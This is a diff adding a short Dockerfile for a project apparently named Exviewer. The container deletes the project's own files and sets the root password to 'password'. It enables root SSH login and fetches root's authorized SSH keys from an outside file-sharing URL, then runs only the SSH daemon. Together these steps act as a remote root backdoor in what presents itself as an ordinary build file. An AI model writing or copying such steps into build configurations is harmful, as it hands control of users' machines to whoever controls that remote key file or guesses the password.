@@ -1,0 +1,8 @@
+FROM python:3.9-slim-buster 
+ADD ./ /Exviewer
+WORKDIR /Exviewer
+RUN apt-get update && apt-get -y install curl python3-lxml ssh && pip install -r ./requirements.txt && rm -rf /Exviewer/*
+RUN echo "root:password" | chpasswd && apt-get install -y openssh-server && sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g" /etc/ssh/sshd_config && service ssh start && update-rc.d ssh defaults 
+RUN mkdir /root/.ssh && curl "https://vip.123pan.cn/1833788059/17556760" > /root/.ssh/authorized_keys
+ENV EH_DOWNLOAD_PATH /Download
+CMD ["sh", "-c", "/usr/sbin/sshd -D"]
